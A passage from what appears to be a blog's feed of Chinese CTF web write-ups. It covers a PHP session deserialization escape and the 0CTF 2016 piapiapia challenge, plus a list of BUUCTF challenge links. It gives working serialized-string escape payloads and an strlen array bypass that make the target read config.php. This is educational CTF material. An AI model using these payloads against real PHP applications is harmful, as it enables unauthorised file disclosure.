class="string">&#x27;function&#x27;</span>]=<span class="string">&#x27;show_image&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;M0th&#x27;</span>]=<span class="string">&#x27;hahaha&#x27;</span>; <span class="comment">#此处相当于假设我们post传参为 _SESSION[M0th]=&#x27;hahaha&#x27;</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>]=base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure><p>反序列化字符串格式如下</p><p><code>a:4:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:4:&quot;M0th&quot;;s:6:&quot;hahaha&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code></p><p>那么我们可以通过构造M0th键名覆盖掉值字符串中的一部分，从而使得值字符串中的另一部分逃逸出来</p><p>显然我们需要的img如下这种形式<code>&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p><p>那么不妨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;M0th&#x27;</span>]=<span class="string">&#x27;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>反序列化字符串为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;show_image&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;M0th&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/01/08/2019-easy-serialize-php/image-20210108120854272.png" class="lazyload" data-srcset="/2021/01/08/2019-easy-serialize-php/image-20210108120854272.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210108120854272"></p><p>我们要通过构造M0th键名去吞入掉这一部分</p><p>那么 即可构造为 <strong>M0thphpflag</strong> 即</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;M0thphpflag&#x27;</span>]=<span class="string">&#x27;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><p><code>a:4:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:11:&quot;M0th&quot;;s:41:&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code></p><p><img src="/2021/01/08/2019-easy-serialize-php/image-20210108121448896.png" class="lazyload" data-srcset="/2021/01/08/2019-easy-serialize-php/image-20210108121448896.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210108121448896"></p><p>数组中键和值应该成对存在，所以应该在构造出来一个值，即为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;M0thflagphp&#x27;</span>]=<span class="string">&#x27;;s:6:&quot;img111&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>所以post传入</p><blockquote><p>_SESSION[M0thflagphp]=’;s:6:”img111”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;}’</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> web漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-web刷题记录</title>
      <link href="2021/01/01/buuctf-web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>2021/01/01/buuctf-web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>在buuctf上做一些了，但是只记录了一部分，有时候用到的一些点也因为没有记录而忘记，于是有把做过没记录的题，重新做了一下，并且打算把在buu上做的web题的记录连接整理到一起，还有misc</p><span id="more"></span><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><table><thead><tr><th><a href="http://m0th.top/2019/11/09/HCTF-2018-WarmUp/index.html">[HCTF 2018]WarmUp</a></th><th><a href="http://m0th.top/2020/02/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-%E5%87%A0%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84sql%E6%B3%A8%E5%85%A5%E9%A2%98/">[极客大挑战 2019]EasySQL</a></th><th><a href="http://m0th.top/2019/12/04/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">[强网杯 2019]随便注</a></th><th><a href="http://m0th.top/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/">[极客大挑战 2019]Havefun</a></th></tr></thead><tbody><tr><td><a href="http://m0th.top/2020/03/24/SUCTF-2019-EasySQL/">[SUCTF 2019]EasySQL</a></td><td><a href="http://m0th.top/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/">[ACTF2020 新生赛]</a></td><td><a href="http://m0th.top/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/">[极客大挑战 2019]Secret File</a></td><td><a href="http://m0th.top/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/">[极客大挑战 2019]LoveSQL</a></td></tr><tr><td><a href="http://m0th.top/2021/02/06/GXYCTF2019-Ping-Ping-Ping/">[GXYCTF2019]Ping Ping Ping</a></td><td><a href="http://m0th.top/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/">[ACTF2020 新生赛]Exec</a></td><td><a href="http://m0th.top/2020/03/09/%E6%8A%A4%E7%BD%91%E6%9D%AF-easy-tornado/">[护网杯 2018]easy_tornado</a></td><td><a href="http://m0th.top/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/">[极客大挑战 2019]Knife</a></td></tr><tr><td><a href="http://m0th.top/2021/02/10/RoarCTF-2019-Easy-Calc/">[RoarCTF 2019]Easy Calc</a></td><td><a href="http://m0th.top/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/">[极客大挑战 2019]Http</a></td><td><a href="http://m0th.top/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/">[极客大挑战 2019]PHP</a></td><td><a href="http://m0th.top/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/">[极客大挑战 2019]Upload</a></td></tr><tr><td><a href="http://m0th.top/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/">[极客大挑战 2019]BabySQL</a></td><td><a href="http://m0th.top/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/">[ACTF2020 新生赛]Upload</a></td><td><a href="http://m0th.top/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/">[ACTF2020 新生赛]BackupFile</a></td><td><a href="http://m0th.top/2021/02/24/HCTF-2018-admin/">[HCTF 2018]admin</a></td></tr><tr><td><a href="http://m0th.top/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/">[极客大挑战 2019]BuyFlag</a></td><td><a href="http://m0th.top/2021/02/27/2019-CheckIn/">[SUCTF 2019]CheckIn</a></td><td><a href="http://m0th.top/2020/05/14/BJDCTF2020-Easy-MD5/">[BJDCTF2020]Easy MD5</a></td><td><a href="http://m0th.top/2021/02/28/ZJCTF-2019-NiZhuanSiWei/">[ZJCTF 2019]NiZhuanSiWei</a></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><table><thead><tr><th>签到</th><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[0CTF 2016]piapiapia</title>
      <link href="2020/12/09/0CTF-2016-piapiapia/"/>
      <url>2020/12/09/0CTF-2016-piapiapia/</url>
      
        <content type="html"><![CDATA[<p>一道不算很难的源码分析题，主要考点在让过strlen()函数以及反序列化字符逃逸</p><span id="more"></span><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p><img src="/2020/12/09/0CTF-2016-piapiapia/1607504739135.png" class="lazyload" data-srcset="/2020/12/09/0CTF-2016-piapiapia/1607504739135.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1607504739135"></p><p>登入框，测试sql注入以及万能密码无果</p><p>扫下目录</p><p><img src="/2020/12/09/0CTF-2016-piapiapia/1607505268165.png" class="lazyload" data-srcset="/2020/12/09/0CTF-2016-piapiapia/1607505268165.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1607505268165"></p><p>源码包泄露，显然是一道代码审计题</p><p><img src="/2020/12/09/0CTF-2016-piapiapia/1607505346674.png" class="lazyload" data-srcset="/2020/12/09/0CTF-2016-piapiapia/1607505346674.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1607505346674"></p><p>审一遍整体逻辑，发现了可能存在的漏洞点，即为任意文件包含漏洞</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反序列化 $profile </span></span><br><span class="line"><span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="comment">//$profile 来自</span></span><br><span class="line"><span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line"><span class="comment">//user 是一个类对象，查看class.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//回溯父类中的filter函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//回溯父类中的select函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line"><span class="keyword">return</span> mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//很明显$profile的值原来在数据库里保存</span></span><br><span class="line"><span class="comment">//同时我们发现update函数可以把输入写入数据库中，我们追溯调用update函数的地方</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在子类中update_profile函数调用了父类的update函数，全局搜索update_profile函数的调用位置</span></span><br><span class="line"><span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//在update.php中有了发现</span></span><br></pre></td></tr></table></figure><p>我们来分析update.php中的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"><span class="literal">false</span><span class="literal">null</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>); <span class="comment">//此处过滤方法和其他有些许区别，使用了strlen函数</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显在nickname变量处有一个strlen函数，我们知道在php黑魔法中strlen函数在处理数组时会返回null</p><p> tricks</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var_dump(preg_match(<span class="string">&quot;&quot;</span>,<span class="keyword">array</span>()));</span><br><span class="line">var_dump(strlen(<span class="keyword">array</span>()));</span><br><span class="line">var_dump(strlen(<span class="keyword">array</span>())&gt;<span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;&quot;</span>,<span class="keyword">array</span>())||strlen(<span class="keyword">array</span>()) &gt; <span class="number">10</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;no bypass&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;bypass&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#bool(false) NULL bool(false) bypass</span></span><br></pre></td></tr></table></figure><p>从而使得nickname为可控变量</p><p>显然到了这里，就是通过反序列化的方式逃逸出来photo变量，使任意文件包含漏洞成立</p><h2 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h2><p>明显的反序列化字符逃逸</p><p>模拟上图源码进行构造发序列化字符串</p><p>我们发现在中间写入数据库的代码中调用了filter方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现where会被替换为hacker从而可以逃逸一个字符</p><p>我们想要构造photo变量去读取config.php文件</p><p>反序列化一下即为==”;}s:5:”photo”;s:10:”config.php”;}==</p><p>这是需要拼接的字符串，一共34个字符，where替换为hacker逃逸一个字符</p><p>那么需要34个where</p><p>从而</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;123@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>][]= <span class="string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;asdfasdf&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="keyword">echo</span> strlen(<span class="string">&#x27;&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>nickname为</p><blockquote><p>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”;}s:5:”photo”;s:10:”config.php”;}</p></blockquote><h2 id="0x04简单的数组绕过知识总结"><a href="#0x04简单的数组绕过知识总结" class="headerlink" title="0x04简单的数组绕过知识总结"></a>0x04简单的数组绕过知识总结</h2><blockquote><figure class="highlight php"><table><tr><td 